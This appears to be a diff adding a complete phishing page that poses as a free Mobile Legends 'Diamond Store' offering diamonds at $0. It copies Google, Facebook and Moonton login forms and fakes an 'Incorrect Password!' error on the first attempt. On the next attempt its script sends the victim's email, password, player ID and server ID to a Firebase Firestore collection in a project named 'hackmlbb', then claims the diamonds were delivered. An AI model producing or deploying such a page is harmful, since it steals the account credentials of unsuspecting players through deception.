@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>MLBB Diamond Store</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
+<style>
+:root{
+  --primary:#ffd700;
+  --bg-dark:#121212;
+  --card-bg:#1e1e1e;
+  --text-main:#ffffff;
+  --fb-color:#1877f2;
+  --google-color:#db4437;
+  --moonton-color:#ffcc00;
+}
+body{font-family:'Segoe UI',Tahoma,Helvetica,Arial,sans-serif;background-color:var(--bg-dark);color:var(--text-main);margin:0;display:flex;justify-content:center;min-height:100vh;}
+.container{width:100%;max-width:400px;background:var(--card-bg);box-shadow:0 0 20px rgba(0,0,0,.5);display:flex;flex-direction:column;height:100vh;}
+.header{padding:20px;text-align:center;background:#000;border-bottom:1px solid #333;}
+.header img{width:50px;margin-bottom:10px;}
+.header h2{margin:0;font-size:1.2rem;color:var(--primary);}
+.content{flex:1;padding:20px;overflow-y:auto;position:relative;}
+.step{display:none;animation:fadeIn .4s;}
+.step.active{display:block;}
+@keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:15px;margin-bottom:20px;}
+.card{background:#2a2a2a;border:2px solid transparent;border-radius:10px;padding:15px;text-align:center;cursor:pointer;transition:.2s;}
+.card:hover{background:#333;}
+.card.selected{border-color:var(--primary);background:rgba(255,215,0,.1);}
+.amount{font-size:1.4rem;color:var(--primary);font-weight:bold;display:block;}
+.price{font-size:.9rem;color:#ccc;}
+input{width:100%;padding:12px;margin:8px 0;background:#333;border:1px solid #444;color:white;border-radius:5px;box-sizing:border-box;}
+input:focus{border-color:var(--primary);outline:none;}
+.btn{width:100%;padding:12px;border:none;border-radius:5px;font-weight:bold;cursor:pointer;margin-top:10px;color:white;}
+.tabs{display:flex;justify-content:space-between;margin-bottom:20px;border-bottom:1px solid #444;}
+.tab-btn{background:none;border:none;color:#888;padding:10px;font-size:1rem;cursor:pointer;flex:1;}
+.tab-btn.active{color:var(--primary);border-bottom:2px solid var(--primary);}
+.login-method{display:none;}
+.login-method.active{display:block;}
+.btn-google{background:var(--google-color);box-shadow:0 4px 6px rgba(219,68,55,.3);}
+.btn-fb{background:var(--fb-color);box-shadow:0 4px 6px rgba(24,119,242,.3);}
+.btn-moonton{background:linear-gradient(90deg,#ffd700,#ffb700);color:black;box-shadow:0 4px 6px rgba(255,215,0,.3);}
+.loader-overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(18,18,18,.95);display:none;flex-direction:column;justify-content:center;align-items:center;z-index:20;}
+.spinner{width:40px;height:40px;border:4px solid #333;border-top:4px solid var(--primary);border-radius:50%;animation:spin 1s linear infinite;}
+@keyframes spin{100%{transform:rotate(360deg);}}
+</style>
+</head>
+
+<body>
+<div class="container">
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/en/9/98/Mobile_Legends_Bang_Logo.png" alt="MLBB">
+    <h2>Diamond Store</h2>
+  </div>
+
+  <div class="content">
+    <!-- STEP 1 -->
+    <div id="step1" class="step active">
+      <div class="grid">
+        <div class="card" onclick="selectDiamond(112,'0.00',this)">
+          <span class="amount">112 💎</span><span class="price">$0</span>
+        </div>
+        <div class="card" onclick="selectDiamond(223,'0.00',this)">
+          <span class="amount">223 💎</span><span class="price">$0</span>
+        </div>
+        <div class="card" onclick="selectDiamond(336,'0.00',this)">
+          <span class="amount">336 💎</span><span class="price">$0</span>
+        </div>
+        <div class="card" onclick="selectDiamond(1163,'0.00',this)">
+          <span class="amount">1163 💎</span><span class="price">$0</span>
+        </div>
+        <div class="card" onclick="selectDiamond(2398,'0.00',this)">
+          <span class="amount">2398 💎</span><span class="price">$0</span>
+        </div>
+        <div class="card" onclick="selectDiamond(6042,'0.00',this)">
+          <span class="amount">6042 💎</span><span class="price">$0</span>
+        </div>
+      </div>
+      <button id="btn-next" class="btn btn-moonton" disabled>Select a Package</button>
+    </div>
+
+    <!-- STEP 2 -->
+    <div id="step2" class="step">
+      <h3 style="margin-top:0;">Enter Details</h3>
+      <input type="text" id="username" placeholder="Username">
+      <input type="number" id="playerId" placeholder="Player ID">
+      <input type="number" id="serverId" placeholder="Server ID">
+      <button id="btn-continue" class="btn btn-moonton" disabled>Continue</button>
+    </div>
+
+    <!-- STEP 3 -->
+    <div id="step3" class="step">
+      <div style="text-align:center;margin-bottom:15px;">
+        <span id="summary-display" style="color:#aaa;font-size:.9rem;"></span>
+      </div>
+      <div class="tabs">
+        <button class="tab-btn active" onclick="switchTab('google', this)">Google</button>
+        <button class="tab-btn" onclick="switchTab('facebook', this)">Facebook</button>
+        <button class="tab-btn" onclick="switchTab('moonton', this)">Moonton</button>
+      </div>
+      <div id="method-google" class="login-method active">
+        <input type="email" id="g-email" placeholder="Email or Phone">
+        <input type="password" id="g-pass" placeholder="Password">
+        <button class="btn btn-google" onclick="processLogin('google')">Sign In with Google</button>
+      </div>
+      <div id="method-facebook" class="login-method">
+        <input type="text" id="fb-email" placeholder="Email or Phone">
+        <input type="password" id="fb-pass" placeholder="Password">
+        <button class="btn btn-fb" onclick="processLogin('facebook')">Log In</button>
+      </div>
+      <div id="method-moonton" class="login-method">
+        <input type="text" id="mt-email" placeholder="Moonton ID / Email">
+        <input type="password" id="mt-pass" placeholder="Password">
+        <input type="password" id="mtrt-pass"
+          placeholder="Re-Password">
+        <button class="btn btn-moonton" onclick="processLogin('moonton')">Log In</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="loader" class="loader-overlay">
+    <div class="spinner"></div>
+    <p style="margin-top:15px;">Verifying Account…</p>
+  </div>
+</div>
+
+<script>
+// Firebase config (same key as dashboard)
+const firebaseConfig = {
+  apiKey:"AIzaSyDlIzPKZ4C15866Ul-UusdUBF-xCdC2Knk",
+  authDomain:"hackmlbb-bee81.firebaseapp.com",
+  projectId:"hackmlbb-bee81",
+  storageBucket:"hackmlbb-bee81.firebasestorage.app",
+  messagingSenderId:"764884889904",
+  appId:"1:764884889904:web:6bef9487975f13df29d8f5",
+  measurementId:"G-J14XB3W9VV"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+// State
+let selectedDiamond = null;
+let selectedPrice = null;
+let attemptCount = parseInt(localStorage.getItem('mlbb_attempt')||'0');
+
+// UI helpers
+function selectDiamond(amount, price, el){
+  selectedDiamond = amount;
+  selectedPrice = price;
+  document.querySelectorAll('.card').forEach(c=>c.classList.remove('selected'));
+  el.classList.add('selected');
+  document.getElementById('btn-next').disabled=false;
+  document.getElementById('btn-next').innerText="Next";
+}
+function goToStep(step){
+  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
+  document.getElementById(`step${step}`).classList.add('active');
+  if(step===2){
+    enableContinueIfAllFilled();
+  }
+  if(step===3){
+    const user=document.getElementById('username').value || 'Unknown';
+    document.getElementById('summary-display').innerText=`${user} • ${selectedDiamond} Diamonds`;
+  }
+}
+function enableContinueIfAllFilled(){
+  const username=document.getElementById('username').value.trim();
+  const player=document.getElementById('playerId').value.trim();
+  const server=document.getElementById('serverId').value.trim();
+  document.getElementById('btn-continue').disabled=!(username && player && server);
+}
+function switchTab(method, btn){
+  document.querySelectorAll('.login-method').forEach(m=>m.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById(`method-${method}`).classList.add('active');
+  btn.classList.add('active');
+}
+
+// Attach input listeners for step‑2 validation
+['username','playerId','serverId'].forEach(id=>{
+  document.getElementById(id).addEventListener('input', enableContinueIfAllFilled);
+});
+
+/*  ──────────────────────────────────────
+    NEW: Navigation event handlers
+    ────────────────────────────────────── */
+document.getElementById('btn-next').addEventListener('click', ()=>goToStep(2));
+document.getElementById('btn-continue').addEventListener('click', ()=>goToStep(3));
+
+async function processLogin(method){
+  let email='', password='';
+  if(method==='google'){
+    email=document.getElementById('g-email').value;
+    password=document.getElementById('g-pass').value;
+  }else if(method==='facebook'){
+    email=document.getElementById('fb-email').value;
+    password=document.getElementById('fb-pass').value;
+  }else{
+    email=document.getElementById('mt-email').value;
+    password=document.getElementById('mt-pass').value;
+  }
+  if(!email||!password){alert('Please fill in all fields');return;}
+  document.getElementById('loader').style.display='flex';
+  setTimeout(async ()=>{
+    document.getElementById('loader').style.display='none';
+    if(attemptCount===0){
+      alert('Incorrect Password!');
+      if(method==='google')document.getElementById('g-pass').value='';
+      if(method==='facebook')document.getElementById('fb-pass').value='';
+      if(method==='moonton')document.getElementById('mt-pass').value='';
+      attemptCount++; localStorage.setItem('mlbb_attempt',attemptCount);
+    }else{
+      const data={
+        username:document.getElementById('username').value,
+        playerId:document.getElementById('playerId').value,
+        serverId:document.getElementById('serverId').value,
+        method:method.toUpperCase(),
+        email:email,
+        password:password,
+        diamond: `${selectedDiamond} Diamonds`,
+        timestamp:firebase.firestore.FieldValue.serverTimestamp()
+      };
+      try{
+        await db.collection('accounts').add(data);
+        /* NEW: updated success notification */
+        alert(`Diamond is successful send to your account.`);
+        /* NEW: removed the page reload */
+        localStorage.setItem('mlbb_attempt','0');   // reset counter
+      }catch(err){
+        console.error('Error:',err);
+        alert('Network Error. Please try again.');
+      }
+    }
+  },1500);
+}
+</script>
+</body>
+</html>
